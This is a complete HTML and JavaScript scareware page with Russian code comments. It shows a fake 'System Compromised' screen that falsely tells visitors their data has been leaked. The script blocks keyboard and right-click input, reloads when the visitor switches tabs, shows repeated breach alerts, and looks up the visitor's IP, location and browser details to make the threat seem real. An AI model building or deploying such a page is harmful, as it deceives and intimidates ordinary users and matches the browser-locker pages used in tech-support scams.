<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
  <title>Access Violation</title>
  <style>
    html, body {
      margin: 0;
      padding: 0;
      overflow: hidden;
      background: black;
      color: red;
      font-family: monospace;
    }
    #overlay {
      position: fixed;
      top: 0; left: 0;
      width: 100%; height: 100%;
      background: black;
      z-index: 9999;
      display: flex;
      justify-content: center;
      align-items: center;
      flex-direction: column;
    }
    #overlay h1 {
      font-size: 4vw;
      animation: glitch 1s infinite;
    }
    p {
      font-size: 1.2vw;
      margin: 3px 0;
    }
    @keyframes glitch {
      0% { text-shadow: 2px 2px red; }
      25% { text-shadow: -2px -2px lime; }
      50% { text-shadow: 2px -2px blue; }
      75% { text-shadow: -2px 2px yellow; }
      100% { text-shadow: 2px 2px red; }
    }
    video {
      position: fixed;
      top: 0; left: 0;
      width: 100%; height: 100%;
      object-fit: cover;
      z-index: 0;
    }
  </style>
</head>
<body>
  <video autoplay loop muted>
    <source src="video.mp4" type="video/mp4">
    Your browser does not support HTML5 video.
  </video>
  <div id="overlay">
    <h1>System Compromised</h1>
    <p id="ip">IP Address: loading...</p>
    <p id="location">Location: loading...</p>
    <p id="os">Platform: loading...</p>
    <p id="ua">User-Agent: loading...</p>
    <p id="tz">Timezone: loading...</p>
    <p id="lang">Language: loading...</p>
    <p>All data has been leaked. Do not turn off your device.</p>
  </div>

  <script>
    // Защита от выхода
    document.addEventListener('keydown', e => e.preventDefault());
    document.addEventListener('contextmenu', e => e.preventDefault());
    window.onbeforeunload = () => "Exit attempt detected.";
    document.onselectstart = () => false;

    // Название вкладки
    let titles = ["Access Violation", "System Breach", "Security Override", "Trace Initiated"];
    let i = 0;
    setInterval(() => {
      document.title = titles[i % titles.length];
      i++;
    }, 1000);

    // Возврат вкладки при переключении
    document.addEventListener("visibilitychange", () => {
      if (document.visibilityState !== "visible") {
        location.reload();
      }
    });

    // Повторные alert
    setInterval(() => {
      alert("Warning: Data breach in progress.");
    }, 20000);

    // Получение IP и гео
    async function fetchIPAndInfo() {
      try {
        const res = await fetch("https://api.ipify.org?format=json");
        const data = await res.json();
        const ip = data.ip;
        document.getElementById("ip").innerText = "IP Address: " + ip;

        const geo = await fetch("https://ipapi.co/" + ip + "/json/").then(r => r.json());
        document.getElementById("location").innerText = "Location: " + geo.city + ", " + geo.country;

      } catch (e) {
        document.getElementById("ip").innerText = "IP Address: Unknown";
        document.getElementById("location").innerText = "Location: Unknown";
      }
    }

    // Системная инфа
    function detectSystemInfo() {
      const agent = navigator.userAgent;
      const platform = navigator.platform;
      const timezone = Intl.DateTimeFormat().resolvedOptions().timeZone;
      const lang = navigator.language;

      document.getElementById("ua").innerText = "User-Agent: " + agent;
      document.getElementById("os").innerText = "Platform: " + platform;
      document.getElementById("tz").innerText = "Timezone: " + timezone;
      document.getElementById("lang").innerText = "Language: " + lang;
    }

    fetchIPAndInfo();
    detectSystemInfo();
  </script>
</body>
</html>
